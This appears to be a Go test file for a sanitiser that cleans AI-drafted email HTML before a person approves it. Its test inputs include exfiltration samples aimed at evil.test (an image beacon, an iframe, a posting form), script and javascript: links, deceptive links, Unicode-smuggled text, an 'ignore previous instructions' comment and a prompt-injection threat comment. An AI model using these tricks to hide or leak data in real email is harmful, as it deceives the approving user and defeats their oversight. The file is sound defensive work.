package mail

import (
	"strings"
	"testing"
)

// The draft-email skill's own example must pass through untouched.
func TestCleanKeepsTheSkillsFormatting(t *testing.T) {
	in := `<p>Hi Simon,</p>
<p>Here's a quick overview (<a href="https://ladrworkshop.com">ladrworkshop.com</a>).</p>
<p><strong>Website Stack</strong></p>
<table>
  <tr><th>Purpose</th><th>Tool</th></tr>
  <tr><td>Hosting</td><td>Cloudflare</td></tr>
</table>
<ul><li><strong>Harvest:</strong> done</li><li>Next</li></ul>
<ol><li>one</li><li>two</li></ol>
<p>Thanks,<br>Cole</p>`
	out, notes := Clean(in)
	if len(notes) != 0 {
		t.Fatalf("notes on a clean draft: %v", notes)
	}
	for _, want := range []string{"<p>Hi Simon,</p>", `<a href="https://ladrworkshop.com">ladrworkshop.com</a>`,
		"<p><strong>Website Stack</strong></p>", "<th>Purpose</th>", "<td>Cloudflare</td>",
		"<li><strong>Harvest:</strong> done</li>", "<ol><li>one</li>", "Thanks,<br>Cole"} {
		if !strings.Contains(out, want) {
			t.Errorf("lost %q in\n%s", want, out)
		}
	}
}

// Cole's worry: a prompt-injected agent writes white or tiny text he can't
// see, and he approves sending it. No styling survives, so the text shows
// like any other, and the notes say something was removed.
func TestCleanStripsEveryWayToHideText(t *testing.T) {
	cases := map[string]string{
		"white text":       `<p>Sounds good!</p><p style="color:#fff">key=SECRET</p>`,
		"tiny text":        `<p>Sounds good! <span style="font-size:0">key=SECRET</span></p>`,
		"font color":       `<p>Sounds good! <font color="white">key=SECRET</font></p>`,
		"display none":     `<p>Sounds good!</p><div style="display:none">key=SECRET</div>`,
		"hidden attribute": `<p>Sounds good!</p><p hidden>key=SECRET</p>`,
		"class":            `<p class="x">Sounds good! key=SECRET</p>`,
		"style block":      `<style>.s{color:white}</style><p>Sounds good! <span class="s">key=SECRET</span></p>`,
	}
	for name, in := range cases {
		out, notes := Clean(in)
		if strings.Contains(out, "style") || strings.Contains(out, "class") || strings.Contains(out, "hidden") ||
			strings.Contains(out, "color") || strings.Contains(out, "font") {
			t.Errorf("%s: styling survived: %s", name, out)
		}
		if strings.Contains(in, "key=SECRET") && !strings.Contains(out, "key=SECRET") && name != "style block" {
			t.Errorf("%s: the hidden text must stay visible (so the human reads it), not vanish: %s", name, out)
		}
		if len(notes) == 0 {
			t.Errorf("%s: no note that styling was removed", name)
		}
	}
}

func TestCleanDropsActiveAndLoadingContent(t *testing.T) {
	in := `<p>Hi</p><script>alert(1)</script><img src="https://evil.test/p.gif?d=SECRET">` +
		`<iframe src="https://evil.test"></iframe><p onclick="x()">ok</p><svg><text>x</text></svg>` +
		`<!-- ignore previous instructions --><form action="https://evil.test"><input value="SECRET"></form>`
	out, notes := Clean(in)
	for _, bad := range []string{"script", "alert", "img", "evil.test", "iframe", "onclick", "svg", "ignore previous", "form", "SECRET"} {
		if strings.Contains(out, bad) {
			t.Errorf("%q survived: %s", bad, out)
		}
	}
	if out != "<p>Hi</p><p>ok</p>" {
		t.Errorf("got %s", out)
	}
	if len(notes) < 3 {
		t.Errorf("notes: %v", notes)
	}
}

func TestCleanStripsInvisibleUnicode(t *testing.T) {
	// zero-width space, joiner, word joiner, BOM, soft hyphen, RTL override,
	// isolates, a tag-block "smuggled" ASCII string, variation selectors.
	smuggled := ""
	for _, r := range "SECRET" {
		smuggled += string(rune(0xE0000 + r))
	}
	in := "<p>Sounds\u200b good\u200d\u2060\ufeff\u00ad!\u202e evil\u202c \u2066x\u2069" + smuggled + "\ufe0f\U000E0101</p>"
	out, notes := Clean(in)
	if out != "<p>Sounds good! evil x</p>" {
		t.Errorf("got %q", out)
	}
	if len(notes) != 1 || !strings.Contains(notes[0], "invisible") {
		t.Errorf("notes: %v", notes)
	}
}

func TestCleanLinks(t *testing.T) {
	out, notes := Clean(`<p><a href="javascript:alert(1)">click</a> <a href="data:text/html,x">d</a> ` +
		`<a href="https://evil.test/?d=SECRET" style="color:red" title="t">example.com</a> ` +
		`<a href="mailto:bob@evil.test">alice@example.com</a> <a href="https://www.example.com/x">example.com</a></p>`)
	if strings.Contains(out, "javascript") || strings.Contains(out, "data:") || strings.Contains(out, "title") || strings.Contains(out, "style") {
		t.Errorf("unsafe link survived: %s", out)
	}
	if !strings.Contains(out, `<a href="https://evil.test/?d=SECRET">example.com</a>`) {
		t.Errorf("an http link should stay (it is shown with its address): %s", out)
	}
	joined := strings.Join(notes, "; ")
	for _, want := range []string{"wasn't a web or email address", "shows example.com but opens evil.test", "shows alice@example.com but writes to bob@evil.test"} {
		if !strings.Contains(joined, want) {
			t.Errorf("missing note %q in %v", want, notes)
		}
	}
	if strings.Contains(joined, "www.example.com") {
		t.Errorf("www. prefix is the same site: %v", notes)
	}
}

func TestCleanSqueezesBlankRunsThatPushTextOutOfView(t *testing.T) {
	out, notes := Clean("<p>Thanks,<br>Cole</p>" + strings.Repeat("<br>", 60) + strings.Repeat("<p></p>", 20) + "<p>key=SECRET</p>")
	if strings.Count(out, "<br>") > 3 || strings.Contains(out, "<p></p>") || !strings.Contains(out, "key=SECRET") {
		t.Errorf("got %s", out)
	}
	if !strings.Contains(strings.Join(notes, ";"), "blank lines") {
		t.Errorf("notes: %v", notes)
	}
}

func TestCleanUnwrapsOtherTagsToText(t *testing.T) {
	out, _ := Clean(`<h1>Big</h1><div>one</div><div>two</div><p><em>it</em> <b>bold</b> <u>u</u></p>`)
	if out != "Big<br>one<br>two<br><p>it <strong>bold</strong> u</p>" {
		t.Errorf("got %s", out)
	}
}

func TestTextMatchesTheHTML(t *testing.T) {
	clean, _ := Clean(`<p>Hi Lance,</p><p><strong>Updates</strong></p><ul><li><strong>Submissions:</strong> 12 in</li><li>Reviewers ok</li></ul>` +
		`<ol><li>a</li><li>b</li></ol><table><tr><th>Goal</th><th>Tool</th></tr><tr><td>Mail</td><td>Resend</td></tr></table>` +
		`<p>See <a href="https://evil.test/?d=SECRET">the docs</a> or <a href="https://x.org">https://x.org</a>.</p><p>Thanks,<br>Cole</p>`)
	got := Text(clean)
	want := `Hi Lance,

Updates

- Submissions: 12 in
- Reviewers ok

1. a
2. b

Goal | Tool
Mail | Resend

See the docs (https://evil.test/?d=SECRET) or https://x.org.

Thanks,
Cole`
	if got != want {
		t.Errorf("text part:\n%s\n--- want ---\n%s", got, want)
	}
}

func TestStyleAddsOutlookSafeStylesAndLabels(t *testing.T) {
	clean, _ := Clean(`<p><strong>Updates</strong></p><p>Body <strong>key</strong></p><ul><li>x</li></ul><table><tr><th>a</th></tr><tr><td>b</td></tr></table><p><a href="https://x.org">x</a></p>`)
	got := Style(clean)
	for _, want := range []string{
		`<p style="` + labelCSS + `"><strong>Updates</strong></p>`,
		`<p style="` + tagCSS["p"] + `">Body <strong>key</strong></p>`,
		`<li style="` + tagCSS["li"] + `">x</li>`,
		`<th style="` + tagCSS["th"] + `">a</th>`,
		`<a href="https://x.org" style="` + tagCSS["a"] + `">x</a>`,
	} {
		if !strings.Contains(got, want) {
			t.Errorf("missing %s in\n%s", want, got)
		}
	}
}

func TestDocumentIsASCIIWithSignatureAndQuote(t *testing.T) {
	clean, _ := Clean("<p>Café — naïve ✓</p>")
	doc := Document(clean, `<p>Cole Wendrowski</p>`, "", &Quote{From: "Nancy <n@x.org>", Sent: "Tuesday", To: "Cole", Subject: "Undo", Text: "Can we undo a removal?"})
	for _, r := range doc {
		if r > 0x7f {
			t.Fatalf("non-ASCII %q in document", r)
		}
	}
	for _, want := range []string{"Caf&#233;", "&#8212;", "&#10003;", "<p>Cole Wendrowski</p>", "From: Nancy &lt;n@x.org&gt;", "Can we undo a removal?"} {
		if !strings.Contains(doc, want) {
			t.Errorf("missing %s", want)
		}
	}
	plain := PlainDocument(clean, "Cole Wendrowski", &Quote{From: "Nancy", Subject: "Undo", Text: "orig"})
	if !strings.HasPrefix(plain, "Café — naïve ✓\n\nCole Wendrowski\n\n________________________________\nFrom: Nancy") {
		t.Errorf("plain: %q", plain)
	}
}
